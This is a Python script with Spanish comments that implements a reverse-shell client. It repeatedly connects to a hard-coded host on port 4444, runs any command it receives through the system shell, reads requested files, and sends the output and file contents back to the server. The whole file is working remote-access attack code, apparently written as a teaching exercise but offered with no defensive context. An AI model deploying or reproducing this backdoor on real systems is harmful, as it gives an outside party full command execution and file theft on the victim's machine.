import socket  # Importa el módulo para la comunicación mediante sockets
import time    # Importa el módulo para manipular el tiempo
import subprocess  # Importa el módulo para ejecutar comandos en el sistema operativo
import platform    # Importa el módulo para obtener información sobre la plataforma del sistema
import os          # Importa el módulo para interactuar con el sistema operativo

# Definición de variables constantes
PUERTO, HOST = 4444, "192.168.0.167"  # Puerto y dirección IP del servidor al que se conectará el cliente
TAM_MAX = 1024  # Tamaño máximo de datos a recibir

# Bucle principal para intentar conectarse al servidor
while True:
    try:
        s = socket.socket()  # Crea un objeto de socket
        s.connect((HOST, PUERTO))  # Intenta conectarse al servidor
    except:
        print('Error de conexión')  # Imprime un mensaje de error en caso de fallo en la conexión
        time.sleep(4)  # Espera 4 segundos antes de intentar nuevamente la conexión
    else:
        print('Conexión establecida')  # Imprime un mensaje de conexión exitosa
        break  # Sale del bucle al establecer la conexión

# Bucle principal para recibir y procesar comandos del servidor
while True:
    cmd = s.recv(TAM_MAX).decode()  # Recibe un comando del servidor y lo decodifica
    if cmd == 'fin':  # Si el comando es 'fin', sale del bucle
        break
    
    # Manejo de diferentes comandos recibidos
    if cmd == 'info':
        respuesta = str(HOST) + str(PUERTO) + platform.platform() + os.getcwd()  # Obtiene información del sistema

    elif cmd[:2] == 'cd':  # Si el comando empieza con 'cd' (cambio de directorio)
        dire = cmd[3:]  # Extrae el directorio especificado en el comando
        if os.path.exists(dire):  # Verifica si el directorio existe
            os.chdir(dire)  # Cambia al directorio especificado
            respuesta = os.getcwd()  # Obtiene el directorio actual
        else:
            respuesta = 'Directorio inexistente'  # Mensaje de directorio inexistente
    
    elif cmd[:2] == 'fl':  # Si el comando empieza con 'fl' (lectura de archivo)
        archivo = cmd[3:]  # Extrae el nombre del archivo especificado en el comando
        try:
            f = open(archivo, 'rb')  # Intenta abrir el archivo en modo lectura binaria
        except FileNotFoundError:  # Maneja el error si el archivo no existe
            respuesta = " ".encode()  # Codifica una cadena vacía como respuesta
        else:
            respuesta = f.read().decode()  # Lee el contenido del archivo y lo decodifica
            f.close()  # Cierra el archivo después de leerlo

    else:
        # Ejecuta cualquier otro comando en el sistema operativo y captura la salida
        resultado = subprocess.run(cmd, shell=True, capture_output=True, universal_newlines=True)
        respuesta = resultado.stdout + resultado.stderr  # Obtiene la salida estándar y de error del comando ejecutado
    
    if not respuesta or len(respuesta) == 0:  # Si no hay respuesta o la respuesta está vacía
        respuesta = " "  # Establece una cadena vacía como respuesta
    respuesta = respuesta.encode()  # Codifica la respuesta como bytes

    # Envía la longitud de los datos seguida de los datos
    longitud_datos = str(len(respuesta)).zfill(13)  # Calcula la longitud de los datos y rellena con ceros a la izquierda hasta 13 caracteres
    print(f'La longitud es {longitud_datos}\n')  # Imprime la longitud de los datos
    s.sendall(longitud_datos.encode())  # Envía la longitud de los datos
    s.sendall(respuesta)  # Envía los datos al servidor

s.close()  # Cierra la conexión al finalizar
